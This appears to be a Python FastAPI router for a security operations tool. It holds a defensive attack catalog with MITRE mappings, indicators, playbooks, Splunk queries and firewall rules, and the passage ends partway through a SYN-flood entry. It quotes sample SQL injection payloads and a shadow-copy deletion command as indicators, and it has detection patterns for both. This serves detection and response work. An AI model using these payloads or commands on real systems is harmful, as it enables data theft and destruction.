from typing import Dict, Any, Optional, List
from fastapi import APIRouter, Query, HTTPException
from pydantic import BaseModel, Field
import json
import logging
from backend.services.threat_intel import threat_intel_service
from backend.services.llm_analyst import llm_analyst, MITRE_TACTICS_MAP
from backend.services.llm_gateway import llm_gateway

logger = logging.getLogger("socchess.routers.ai_analysis")

router = APIRouter(prefix="/api/ai-analysis", tags=["AI Threat Analysis & Attack Anatomy"])

# ═══════════════════════════════════════════════════════════════
# COMPREHENSIVE ATTACK CATALOG & ANATOMY KNOWLEDGEBASE
# ═══════════════════════════════════════════════════════════════
ATTACK_CATALOG: Dict[str, Dict[str, Any]] = {
    "DDoS": {
        "id": "ddos-flood",
        "name": "Distributed Denial of Service (DDoS)",
        "category": "Network Volumetric",
        "severity": "CRITICAL",
        "default_port": 80,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Impact",
            "tactic_id": "TA0040",
            "technique_id": "T1498",
            "technique_name": "Network Denial of Service",
            "sub_technique": "T1498.001 (Direct Network Flood)",
            "url": "https://attack.mitre.org/techniques/T1498/"
        },
        "adversaries": ["Mirai Botnet", "Killnet", "Anonymous Sudan", "NoName057(16)"],
        "anatomy": {
            "summary": "An adversary harnesses a swarm of compromised hosts (botnet) to overwhelm target network bandwidth, stateful connection tables, or edge routing hardware with multi-gigabit traffic surges.",
            "attack_mechanism": "High-velocity flood of spoofed SYN packets or UDP datagrams without completing the 3-way TCP handshake. This saturates the target's half-open connection queue (SYN backlog) and exhausts system memory.",
            "target_vulnerability": "TCP/IP RFC 793 standard 3-way handshake design (state allocation upon receiving SYN) and absence of volumetric upstream scrubbing.",
            "affected_layers": ["Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)"],
            "blast_radius": "Entire network edge, upstream ISP transit links, reverse proxies, and any colocated services sharing the public IP."
        },
        "telemetry_indicators": [
            "Massive surge in SYN flag packets without subsequent ACK or PSH-ACK.",
            "Extremely low byte-to-packet ratio (~40-64 bytes per packet).",
            "High entropy of randomized spoofed source IP addresses.",
            "TCP connection table utilization approaching 100%."
        ],
        "playbook_steps": [
            "Step 1 (Triage): Validate edge bandwidth and identify target virtual IP (VIP) and port.",
            "Step 2 (BGP Divert): Route inbound traffic through upstream DDoS scrubbing center (e.g. Cloudflare Magic Transit, AWS Shield).",
            "Step 3 (Host Hardening): Enable SYN cookies (`sysctl -w net.ipv4.tcp_syncookies=1`) and reduce `tcp_synack_retries` to 2.",
            "Step 4 (Perimeter Drop): Deploy rate-limiting acl on core router / firewall dropping stateless SYN bursts.",
            "Step 5 (Post-Incident): Analyze pcap trace in Wireshark for repeated payload signatures and botnet agent strings."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" OR sourcetype="cisco:asa" action=allowed transport=tcp\n| stats count as syn_count, dc(src_ip) as unique_sources by dest_ip, dest_port\n| where syn_count > 1000\n| sort - syn_count',
        "firewall_rules": {
            "iptables": "iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -m limit --limit 50/s --limit-burst 100 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-DDoS-Aggressor" dir=in action=block protocol=TCP remoteip={source_ip}'
        }
    },
    "SSH-BruteForce": {
        "id": "ssh-bruteforce",
        "name": "SSH Credential Brute Force & Password Spraying",
        "category": "Credential Access",
        "severity": "HIGH",
        "default_port": 22,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Credential Access",
            "tactic_id": "TA0006",
            "technique_id": "T1110",
            "technique_name": "Brute Force",
            "sub_technique": "T1110.001 (Password Guessing)",
            "url": "https://attack.mitre.org/techniques/T1110/"
        },
        "adversaries": ["APT28 (Fancy Bear)", "Rocke Group", "TeamTNT", "FIN7"],
        "anatomy": {
            "summary": "Automated scripts systematically submit thousands of username and password combinations against an open SSH daemon in an effort to gain interactive root shell access.",
            "attack_mechanism": "Rapid TCP session initiation followed by repeated SSH-2.0 protocol handshakes with cryptographic negotiation and failed `SSH_MSG_USERAUTH_REQUEST` packets containing dictionary passwords.",
            "target_vulnerability": "Weak, default, or reused user passwords; lack of multi-factor authentication (MFA); exposure of port 22 directly to public internet.",
            "affected_layers": ["Layer 7 (Application)", "Host OS Authentication PAM Subsystem"],
            "blast_radius": "Full interactive host compromise, lateral movement pivot point within internal management subnet, potential credential dumping."
        },
        "telemetry_indicators": [
            "Dozens to hundreds of connection attempts per minute from a single or distributed IP block.",
            "Linux `/var/log/auth.log` containing repeated 'Failed password for invalid user ... from ... port ... ssh2'.",
            "Consistent payload sizes corresponding to SSH key exchange handshakes.",
            "High proportion of terminated sessions immediately following auth failure."
        ],
        "playbook_steps": [
            "Step 1 (Block IP): Immediately blacklist offending source IP on perimeter and host firewall.",
            "Step 2 (Enforce Keys): Disable password authentication in `/etc/ssh/sshd_config` (`PasswordAuthentication no`).",
            "Step 3 (Enable Fail2Ban): Deploy Fail2Ban or CrowdSec to automatically jail sources after 3 failed attempts.",
            "Step 4 (Port Obfuscation / Bastion): Move SSH off default port 22 or mandate WireGuard/Tailscale VPN access.",
            "Step 5 (Audit Compromise): Inspect `last` and `/var/log/secure` to ensure no successful logins occurred from the attacking subnet."
        ],
        "splunk_query": 'index=* (sourcetype="linux_secure" OR sourcetype="syslog") "Failed password"\n| stats count as failure_count by src_ip, user, dest_ip\n| where failure_count > 10\n| sort - failure_count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 22 -s {source_ip} -j DROP\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-SSH-Attacker" dir=in action=block protocol=TCP remoteip={source_ip}'
        }
    },
    "SQLInjection": {
        "id": "sqli-exploit",
        "name": "SQL Injection (SQLi) Data Exfiltration",
        "category": "Application Exploit",
        "severity": "CRITICAL",
        "default_port": 80,
        "default_protocol": "HTTP",
        "mitre": {
            "tactic": "Initial Access / Defense Evasion",
            "tactic_id": "TA0001",
            "technique_id": "T1190",
            "technique_name": "Exploit Public-Facing Application",
            "sub_technique": "CWE-89 (Improper Neutralization of SQL Commands)",
            "url": "https://attack.mitre.org/techniques/T1190/"
        },
        "adversaries": ["Lazarus Group", "Magecart", "Cozy Bear", "BlackCat"],
        "anatomy": {
            "summary": "Attacker injects malicious SQL tokens into web application input vectors (query parameters, POST bodies, HTTP headers), subverting the database interpreter to dump data or execute operating system commands.",
            "attack_mechanism": "Payloads such as `' UNION SELECT 1,username,password_hash FROM users--`, `OR 1=1`, or time-based blind sleep statements (`WAITFOR DELAY '0:0:5'`) force the back-end DBMS to execute unintended syntax.",
            "target_vulnerability": "Dynamic string concatenation in SQL queries without parameterized prepared statements, ORM abstraction, or input sanitization.",
            "affected_layers": ["Layer 7 (Application)", "Database Engine (MySQL / PostgreSQL / MSSQL)"],
            "blast_radius": "Full database breach (PII, credentials, payment data), potential database takeover via `xp_cmdshell` or `INTO OUTFILE` webshell drop."
        },
        "telemetry_indicators": [
            "HTTP request URI or payload containing encoded SQL syntax (`%27`, `UNION+SELECT`, `CHAR()`, `SLEEP`).",
            "Database error logs containing syntax exceptions (`Syntax error in SQL statement`, `ORA-00936`).",
            "Abnormal HTTP 500 response codes or unusually large HTTP response payloads.",
            "Significant delta between query time and standard response latency (time-based blind)."
        ],
        "playbook_steps": [
            "Step 1 (WAF Virtual Patch): Enable WAF SQLi inspection rule set (OWASP CRS rule 942100) to block malicious patterns.",
            "Step 2 (Source Isolation): Block attacker IP and session cookie on application gateway.",
            "Step 3 (Code Remediation): Convert vulnerable database queries to parameterized prepared statements.",
            "Step 4 (Database Least Privilege): Restrict application DB user permissions (revoke `FILE`, `SUPER`, `xp_cmdshell`).",
            "Step 5 (Exfiltration Triage): Review database audit logs to determine exact tables and rows read during the incident."
        ],
        "splunk_query": 'index=* sourcetype="access_combined" OR sourcetype="iis"\n| rex field=uri "(?i)(union|select|insert|update|delete|drop|benchmark|sleep)"\n| stats count, values(uri) as payloads by src_ip, dest_ip, status\n| sort - count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 80 -s {source_ip} -j DROP\niptables -I INPUT -p tcp --dport 443 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-SQLi-Actor" dir=in action=block remoteip={source_ip}'
        }
    },
    "Botnet": {
        "id": "botnet-c2",
        "name": "Botnet Command & Control (C2) Beaconing",
        "category": "Command & Control",
        "severity": "CRITICAL",
        "default_port": 443,
        "default_protocol": "TCP/TLS",
        "mitre": {
            "tactic": "Command and Control",
            "tactic_id": "TA0011",
            "technique_id": "T1071",
            "technique_name": "Application Layer Protocol",
            "sub_technique": "T1071.001 (Web Protocols - C2)",
            "url": "https://attack.mitre.org/techniques/T1071/"
        },
        "adversaries": ["Emotet", "Cobalt Strike Beacons", "Qakbot", "Sliver C2"],
        "anatomy": {
            "summary": "An infected endpoint initiates recurring outbound connections to a threat actor's Command & Control infrastructure to receive instructions, report system status, or download secondary payloads.",
            "attack_mechanism": "Encrypted HTTP/HTTPS or DNS tunneling requests dispatched at regular or jittered intervals (e.g. every 60s ± 10%). Payload carries serialized victim metadata and awaits tasking instructions.",
            "target_vulnerability": "Malware execution on host (phishing macro, unpatched vulnerability, compromised dependency), permissive egress network policies.",
            "affected_layers": ["Layer 7 (Application Protocols)", "Host Process Memory", "Endpoint OS"],
            "blast_radius": "Full enterprise network exposure: attacker has persistent interactive footing on compromised device with capability to stage ransomware or exfiltrate IP."
        },
        "telemetry_indicators": [
            "Outbound traffic exhibiting strict periodicity (jitter low) to unclassified external IP or dynamic DNS domain.",
            "High frequency of small requests with uniform byte size in both upstream and downstream directions.",
            "Unusual User-Agent strings or self-signed / untrusted TLS certificates on destination server.",
            "DNS queries to newly registered domains (NRDs) or domain generation algorithms (DGAs)."
        ],
        "playbook_steps": [
            "Step 1 (Endpoint Quarantine): Immediately isolate host from network via EDR/firewall to sever C2 lifeline.",
            "Step 2 (Network Sinkhole): Blackhole C2 domain in internal DNS and add IP to perimeter egress blocklist.",
            "Step 3 (Memory Capture): Extract volatile memory image (RAM dump) for Volatility analysis of injected DLLs.",
            "Step 4 (Process Termination): Identify and terminate malicious PID (inspect hollowed processes like `svchost.exe` or `explorer.exe`).",
            "Step 5 (Enterprise Scope): Query SIEM for all other endpoints communicating with identical C2 IP/domain in past 30 days."
        ],
        "splunk_query": 'index=* sourcetype="bro:conn" OR sourcetype="pan:traffic" direction=outbound\n| bin _time span=1m\n| stats count by src_ip, dest_ip, dest_port, _time\n| stats var(count) as variance, avg(count) as avg_conn, count as time_buckets by src_ip, dest_ip, dest_port\n| where time_buckets > 15 AND variance < 3\n| sort - time_buckets',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -d {source_ip} -j REJECT --reject-with icmp-admin-prohibited\niptables -I INPUT -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-C2-Egress" dir=out action=block remoteip={source_ip}'
        }
    },
    "Port Scan": {
        "id": "port-scan-recon",
        "name": "Host Reconnaissance & Port Scanning",
        "category": "Discovery",
        "severity": "MEDIUM",
        "default_port": 0,
        "default_protocol": "TCP/SYN",
        "mitre": {
            "tactic": "Discovery",
            "tactic_id": "TA0007",
            "technique_id": "T1046",
            "technique_name": "Network Service Discovery",
            "sub_technique": "T1046 (Scanning IP/Port Ranges)",
            "url": "https://attack.mitre.org/techniques/T1046/"
        },
        "adversaries": ["Shodan Bots", "Censys", "Red Team Operators", "Script Kiddies"],
        "anatomy": {
            "summary": "Adversary probes ranges of TCP/UDP ports across one or more target IP addresses to identify exposed services, software versions, and potential entry vectors.",
            "attack_mechanism": "Sequential or randomized SYN packets sent across ports 1-65535 (SYN Stealth Scan / Nmap `-sS`). Target responses (SYN-ACK vs RST) expose whether ports are open, closed, or filtered.",
            "target_vulnerability": "Permissive perimeter firewall rules allowing unauthenticated ingress probes, open non-essential ports, banners exposing exact software versions.",
            "affected_layers": ["Layer 4 (Transport)", "Network Perimeter"],
            "blast_radius": "Pre-attack reconnaissance stage. Does not compromise data directly, but maps vulnerable software for imminent exploitation."
        },
        "telemetry_indicators": [
            "Single external IP attempting connections to hundreds of distinct destination ports within seconds.",
            "RST packets generated by target operating system responding to probes on closed ports.",
            "Unusual flag combinations (FIN, XMAS, NULL scans) designed to bypass legacy packet filters.",
            "No application-layer data exchanged after TCP handshake completion."
        ],
        "playbook_steps": [
            "Step 1 (Drop Scanner): Implement rate-limiting drop on perimeter firewall for anomalous port variety.",
            "Step 2 (Close Ports): Audit and close unnecessary listening services detected in the scan range.",
            "Step 3 (Deploy Honeyports): Configure decoy ports (e.g. port 23/21) that automatically trigger IP blacklisting when touched.",
            "Step 4 (Banner Scrubbing): Obfuscate service banners on remaining public endpoints (e.g., Apache `ServerTokens Prod`).",
            "Step 5 (Monitor Escalation): Watch scanner IP for follow-up targeted exploit attempts against open ports."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" OR sourcetype="cisco:asa" action=blocked OR action=denied\n| stats dc(dest_port) as scanned_ports, count as probe_count by src_ip, dest_ip\n| where scanned_ports > 25\n| sort - scanned_ports',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -s {source_ip} -j DROP\niptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP\niptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Port-Scanner" dir=in action=block remoteip={source_ip}'
        }
    },
    "Infiltration": {
        "id": "ransomware-infiltration",
        "name": "Host Infiltration & Lateral Ransomware Staging",
        "category": "Execution & Lateral Movement",
        "severity": "CRITICAL",
        "default_port": 445,
        "default_protocol": "SMB",
        "mitre": {
            "tactic": "Lateral Movement / Execution",
            "tactic_id": "TA0008",
            "technique_id": "T1021",
            "technique_name": "Remote Services",
            "sub_technique": "T1021.002 (SMB/Windows Admin Shares)",
            "url": "https://attack.mitre.org/techniques/T1021/"
        },
        "adversaries": ["LockBit 3.0", "Black Basta", "Conti", "ALPHV (BlackCat)"],
        "anatomy": {
            "summary": "Adversary leverages compromised credentials or protocol exploits to pivot through internal network segments via SMB / RPC, staging ransomware encrypters and exfiltration utilities.",
            "attack_mechanism": "Exploitation of Windows Admin Shares (`ADMIN$`, `C$`) and remote process execution via WMI or PsExec. Attackers disable endpoint protections and prepare mass file encryption.",
            "target_vulnerability": "Unpatched SMBv1/v2 vulnerabilities (e.g. EternalBlue MS17-010), unsegmented internal network, shared local administrator passwords (pass-the-hash).",
            "affected_layers": ["Layer 7 (SMB/RPC)", "Active Directory Domain", "Storage / File Systems"],
            "blast_radius": "Catastrophic enterprise risk: widespread file encryption, operational shutdown, and double-extortion data leak."
        },
        "telemetry_indicators": [
            "Sudden spike in SMB traffic (port 445) between internal workstations that do not normally interact.",
            "High rate of file rename and creation operations (.locked, .enc, .readme.txt).",
            "PowerShell execution with base64-encoded strings and `-ExecutionPolicy Bypass`.",
            "Deletion of Windows Volume Shadow Copies via `vssadmin delete shadows /all /quiet`."
        ],
        "playbook_steps": [
            "Step 1 (Emergency Network Isolation): Sever connection between affected subnet and core domain controllers.",
            "Step 2 (Halt Storage Sync): Pause cloud backups and file-share syncing to protect unencrypted recovery points.",
            "Step 3 (Revoke Privileges): Force password reset and session invalidation for all Enterprise and Domain Admin accounts.",
            "Step 4 (EDR Containment): Trigger enterprise-wide EDR lock on any endpoints executing suspicious encryption threads.",
            "Step 5 (Root Cause Forensics): Identify weaponized initial ingress vector and preserve uncorrupted disk snapshots."
        ],
        "splunk_query": 'index=* (sourcetype="WinEventLog:Security" EventCode=4688) OR (sourcetype="powershell")\n| search "vssadmin" OR "wbadmin" OR "bcdedit" OR "shadows"\n| stats count, values(CommandLine) by ComputerName, SubjectUserName, _time',
        "firewall_rules": {
            "iptables": "iptables -I FORWARD -p tcp --dport 445 -s {source_ip} -j DROP\niptables -I INPUT -p tcp --dport 445 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-SMB-Infiltration" dir=in action=block protocol=TCP localport=445 remoteip={source_ip}'
        }
    },

    # ───────────────────────────────────────────────────────────
    # 1. RECONNAISSANCE
    # ───────────────────────────────────────────────────────────
    "Network Scan": {
        "id": "network-scan-sweep",
        "name": "Network Subnet Sweep & IP Sweep",
        "category": "Reconnaissance",
        "severity": "MEDIUM",
        "default_port": 0,
        "default_protocol": "ICMP/TCP",
        "mitre": {
            "tactic": "Reconnaissance",
            "tactic_id": "TA0043",
            "technique_id": "T1595.001",
            "technique_name": "Active Scanning: Scanning IP Blocks",
            "sub_technique": "T1595.001 (IP Sweep / Ping Sweep)",
            "url": "https://attack.mitre.org/techniques/T1595/001/"
        },
        "adversaries": ["APT29 (Nobelium)", "Lazarus Group", "Red Teams"],
        "anatomy": {
            "summary": "Adversary sweeps an entire IP CIDR subnet looking for responsive live endpoints before launching focused exploitation attempts.",
            "attack_mechanism": "Sequential ICMP Echo, TCP SYN probes to common ports (80, 443, 445), or ARP broadcast sweeps to enumerate active host addresses.",
            "target_vulnerability": "Permissive subnet routing, exposed internal network management, and lack of internal microsegmentation.",
            "affected_layers": ["Layer 3 (IP)", "Layer 4 (Transport)"],
            "blast_radius": "Subnet topology disclosure, perimeter mapping, asset exposure."
        },
        "telemetry_indicators": [
            "Rapid increment of destination IP addresses (+1 sequential pattern).",
            "High ICMP Type 8 Echo Request rate without corresponding bidirectional application data.",
            "Surge in ARP table broadcast inquiries."
        ],
        "playbook_steps": [
            "Step 1: Identify offending source IP from internal firewall or IDS alert.",
            "Step 2: Apply dynamic rate-limiting or null-route source IP on core gateway.",
            "Step 3: Verify host isolation rules between user VLANs and critical server segments.",
            "Step 4: Audit responding hosts for unpatched public vulnerabilities."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" action=blocked OR action=allowed\n| stats dc(dest_ip) as target_count by src_ip\n| where target_count > 50\n| sort - target_count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Subnet-Scanner" dir=in action=block remoteip={source_ip}'
        }
    },
    "Host Discovery": {
        "id": "host-discovery-probe",
        "name": "Remote Host Discovery & Topology Mapping",
        "category": "Discovery",
        "severity": "LOW",
        "default_port": 0,
        "default_protocol": "ICMP/ARP",
        "mitre": {
            "tactic": "Discovery",
            "tactic_id": "TA0007",
            "technique_id": "T1018",
            "technique_name": "Remote System Discovery",
            "sub_technique": "T1018 (Host Enumeration)",
            "url": "https://attack.mitre.org/techniques/T1018/"
        },
        "adversaries": ["Threat Actors staging post-exploitation lateral movement"],
        "anatomy": {
            "summary": "Adversary attempts to identify responsive remote host machines on local segments using ARP, NetBIOS, or ICMP queries.",
            "attack_mechanism": "Execution of discovery utilities (e.g. `arp -a`, `net view`, Ping sweep) to locate enterprise assets and high-value servers.",
            "target_vulnerability": "Unsegmented internal flat networks with broad broadcast domain visibility.",
            "affected_layers": ["Layer 2 (Data Link)", "Layer 3 (Network)"],
            "blast_radius": "Visibility into internal corporate server infrastructure."
        },
        "telemetry_indicators": [
            "Unusual broadcast packet generation from a single workstation.",
            "ICMP echo queries targeting non-existent internal addresses."
        ],
        "playbook_steps": [
            "Step 1: Check workstation process logs for unauthorized network discovery tooling.",
            "Step 2: Restrict ICMP echo permissions across non-management network segments.",
            "Step 3: Monitor source workstation for lateral movement pivots."
        ],
        "splunk_query": 'index=* sourcetype="WinEventLog:Security" EventCode=4688 (CommandLine="*arp -a*" OR CommandLine="*net view*")\n| stats count by ComputerName, SubjectUserName',
        "firewall_rules": {
            "iptables": "iptables -A INPUT -p icmp --icmp-type echo-request -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Host-Discovery" dir=in protocol=ICMPv4 remoteip={source_ip} action=block'
        }
    },
    "Service Enumeration": {
        "id": "service-banner-enumeration",
        "name": "Service Enumeration & Version Fingerprinting",
        "category": "Discovery",
        "severity": "MEDIUM",
        "default_port": 80,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Discovery",
            "tactic_id": "TA0007",
            "technique_id": "T1046",
            "technique_name": "Network Service Discovery",
            "sub_technique": "T1046 (Banner Grabbing & Protocol Version Handshake)",
            "url": "https://attack.mitre.org/techniques/T1046/"
        },
        "adversaries": ["Nmap Version Probers", "Automated Exploitation Frameworks"],
        "anatomy": {
            "summary": "Adversary connects to open ports and sends protocol-specific probes to elicit response headers disclosing precise service software versions.",
            "attack_mechanism": "Handshaking with HTTP, SSH, FTP, SMTP services to extract `Server: Apache/2.4.49` or `SSH-2.0-OpenSSH_8.2` banners for CVE matching.",
            "target_vulnerability": "Default configuration publishing detailed software vendor and version strings in header banners.",
            "affected_layers": ["Layer 7 (Application)"],
            "blast_radius": "Precision matching of 1-day/0-day vulnerabilities against target services."
        },
        "telemetry_indicators": [
            "High variety of protocol probes without meaningful follow-up transactions.",
            "HTTP requests with empty or anomalous User-Agents requesting non-existent endpoints (`/`, `/robots.txt`, `/cgi-bin/`)."
        ],
        "playbook_steps": [
            "Step 1: Configure banner masking across web servers, SSH deamons, and mail servers.",
            "Step 2: Blacklist probing IP address on edge WAF and perimeter firewall.",
            "Step 3: Audit all enumerated services for published critical vulnerabilities."
        ],
        "splunk_query": 'index=* sourcetype="access_combined" (status=404 OR status=400)\n| stats count as failed_probes, dc(uri) as distinct_endpoints by src_ip\n| where distinct_endpoints > 20\n| sort - distinct_endpoints',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Service-Enumerator" dir=in action=block remoteip={source_ip}'
        }
    },

    # ───────────────────────────────────────────────────────────
    # 2. CREDENTIAL ATTACKS
    # ───────────────────────────────────────────────────────────
    "RDP Brute Force": {
        "id": "rdp-bruteforce",
        "name": "RDP Credential Brute Force & Password Spraying",
        "category": "Credential Access",
        "severity": "CRITICAL",
        "default_port": 3389,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Credential Access",
            "tactic_id": "TA0006",
            "technique_id": "T1110.001",
            "technique_name": "Brute Force: Password Guessing (RDP)",
            "sub_technique": "T1110.001 (RDP Authentication Flooding)",
            "url": "https://attack.mitre.org/techniques/T1110/001/"
        },
        "adversaries": ["LockBit", "BlackBasta", "FIN7", "APT33"],
        "anatomy": {
            "summary": "Adversary floods exposed Windows Remote Desktop Protocol (port 3389) with dictionary credentials or password spray attempts targeting domain accounts.",
            "attack_mechanism": "Repeated RDP CredSSP connection sequences transmitting randomized or dictionary credentials resulting in Windows Event ID 4625 (Logon Failure).",
            "target_vulnerability": "RDP port 3389 exposed directly to the internet without VPN or MFA; lack of account lockout thresholds.",
            "affected_layers": ["Layer 7 (RDP)", "Windows LSASS / Security Subsystem"],
            "blast_radius": "Full interactive Windows desktop access, Domain Controller breach, ransomware execution."
        },
        "telemetry_indicators": [
            "Surge in Windows Security Event 4625 (Failure Reason: %%2313 Unknown user name or bad password).",
            "Logon Type 10 (RemoteInteractive) or Type 3 (Network) failures from external IP address.",
            "Rapid connection teardowns on TCP port 3389."
        ],
        "playbook_steps": [
            "Step 1: Immediately block aggressive source IP in perimeter firewall and Windows Firewall.",
            "Step 2: Restrict RDP port 3389 to internal VPN or Bastion Jumpbox subnets.",
            "Step 3: Enable Network Level Authentication (NLA) and Windows Account Lockout Policy (e.g. 5 attempts).",
            "Step 4: Check Event ID 4624 to ensure zero successful authentications occurred from attacker IP."
        ],
        "splunk_query": 'index=* sourcetype="WinEventLog:Security" EventCode=4625 Logon_Type=10\n| stats count as failure_count by IpAddress, TargetUserName\n| where failure_count > 5\n| sort - failure_count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 3389 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-RDP-BruteForcer" dir=in action=block protocol=TCP localport=3389 remoteip={source_ip}'
        }
    },
    "FTP Brute Force": {
        "id": "ftp-bruteforce",
        "name": "FTP Credential Brute Force Attack",
        "category": "Credential Access",
        "severity": "HIGH",
        "default_port": 21,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Credential Access",
            "tactic_id": "TA0006",
            "technique_id": "T1110.001",
            "technique_name": "Brute Force: Password Guessing (FTP)",
            "sub_technique": "T1110.001 (FTP USER/PASS Spray)",
            "url": "https://attack.mitre.org/techniques/T1110/001/"
        },
        "adversaries": ["Automated credential scrapers", "Botnets"],
        "anatomy": {
            "summary": "Automated scripts systematically submit USER and PASS command pairs over plaintext FTP port 21 to gain unauthorized file storage access.",
            "attack_mechanism": "High-frequency TCP sessions sending `USER anonymous`, `USER root`, `PASS ...` checking for standard default passwords.",
            "target_vulnerability": "Legacy plaintext FTP service exposure; anonymous uploads enabled; weak credential policies.",
            "affected_layers": ["Layer 7 (FTP)", "Host File System"],
            "blast_radius": "Web root defacement, malicious payload staging, sensitive file leakage."
        },
        "telemetry_indicators": [
            "FTP error code 530 (Login incorrect) repeated dozens of times per minute.",
            "High rate of aborted TCP sessions on port 21."
        ],
        "playbook_steps": [
            "Step 1: Blacklist source IP on perimeter and host firewall.",
            "Step 2: Migrate legacy FTP to SFTP (SSH File Transfer Protocol) or FTPS with TLS.",
            "Step 3: Disable anonymous FTP login and enforce complex user passwords."
        ],
        "splunk_query": 'index=* sourcetype="vsftpd" OR sourcetype="proftpd" "FAIL LOGIN"\n| stats count as fail_count by src_ip, user\n| where fail_count > 10\n| sort - fail_count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 21 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-FTP-BruteForce" dir=in action=block protocol=TCP localport=21 remoteip={source_ip}'
        }
    },
    "Web Login Brute Force": {
        "id": "web-login-bruteforce",
        "name": "Web Application Login Brute Force & Credential Stuffing",
        "category": "Credential Access",
        "severity": "HIGH",
        "default_port": 443,
        "default_protocol": "HTTPS",
        "mitre": {
            "tactic": "Credential Access",
            "tactic_id": "TA0006",
            "technique_id": "T1110.001",
            "technique_name": "Brute Force: Password Spraying (Web Login)",
            "sub_technique": "T1110.001 (Web Authentication Flooding)",
            "url": "https://attack.mitre.org/techniques/T1110/001/"
        },
        "adversaries": ["Credential Stuffing Botnets", "Account Takeover (ATO) Groups"],
        "anatomy": {
            "summary": "Threat actors execute automated POST requests against web login endpoints (`/login`, `/api/auth`) attempting leaked credential pairs.",
            "attack_mechanism": "High-concurrency HTTP POST requests carrying JSON or form-encoded credential bodies trying thousands of accounts across rotating proxies.",
            "target_vulnerability": "Absence of rate-limiting, CAPTCHA, or multi-factor authentication on web login forms.",
            "affected_layers": ["Layer 7 (HTTP/HTTPS)", "Application Session Management"],
            "blast_radius": "User account compromise, PII theft, unauthorized customer data manipulation."
        },
        "telemetry_indicators": [
            "Surge in HTTP 401 Unauthorized or HTTP 403 Forbidden responses.",
            "Abnormal ratio of POST /login requests compared to GET requests for static assets.",
            "Multiple distinct usernames attempted from identical source IP or ASN."
        ],
        "playbook_steps": [
            "Step 1: Enforce IP-based rate limiting on `/login` via WAF / Reverse Proxy.",
            "Step 2: Trigger CAPTCHA challenge after 3 failed login attempts.",
            "Step 3: Force password reset for any accounts compromised during the attack window.",
            "Step 4: Enable Multi-Factor Authentication (MFA) across all application users."
        ],
        "splunk_query": 'index=* sourcetype="access_combined" uri_path="/api/auth/login" (status=401 OR status=403)\n| stats count as auth_failures, values(user) as attempted_users by src_ip\n| where auth_failures > 15\n| sort - auth_failures',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 443 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Web-Login-Attacker" dir=in action=block remoteip={source_ip}'
        }
    },

    # ───────────────────────────────────────────────────────────
    # 3. NETWORK ATTACKS
    # ───────────────────────────────────────────────────────────
    "SYN Flood": {
        "id": "syn-flood-attack",
        "name": "TCP SYN Backlog Saturation Flood",
        "category": "Network Volumetric",
        "severity": "CRITICAL",
        "default_port": 80,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Impact",
            "tactic_id": "TA0040",
            "technique_id": "T1498.001",
            "technique_name": "Network Denial of Service: Direct Network Flood",
            "sub_technique": "T1498.001 (SYN Flood Exhaustion)",
            "url": "https://attack.mitre.org/techniques/T1498/001/"
        },
        "adversaries": ["Mirai", "Killnet", "DDoS-for-Hire Booteers"],
        "anatomy": {
            "summary": "Rapid succession of TCP SYN packets sent to a target port without completing the 3-way handshake, exhausting the operating system's half-open connection table.",
            "attack_mechanism": "Attacker transmits SYN packets with spoofed source IPs. Target allocates memory in SYN queue and replies with SYN-ACK, but receives no ACK. Half-open connection table overflows.",
            "target_vulnerability": "Finite kernel SYN backlog queue size (`net.ipv4.tcp_max_syn_backlog`) and disabled SYN cookies.",
            "affected_layers": ["Layer 4 (Transport)", "Kernel Network Stack"],
            "blast_radius": "Complete unresponsiveness of web server or network gateway to legitimate users."
        },
        "telemetry_indicators": [
            "SYN flag count ratio exceeds 90% of total TCP packets.",
            "High rate of SYN-RECV sockets shown in `netstat -ant`.",
            "Incoming packet rates > 50,000 pkts/sec with zero ACK payloads."
        ],
        "playbook_steps": [
            "Step 1: Enable TCP SYN cookies immediately: `sysctl -w net.ipv4.tcp_syncookies=1`.",
            "Step 2: Reduce TCP SYN-ACK retries: `sysctl -w net.ipv4.tcp_synack_retries=2`.",
            "Step 3: Route incoming traffic through anti-DDoS scrubbing proxy or CDN.",
            "Step 4: Rate-limit SYN packets per IP on edge iptables/firewall."
        ],
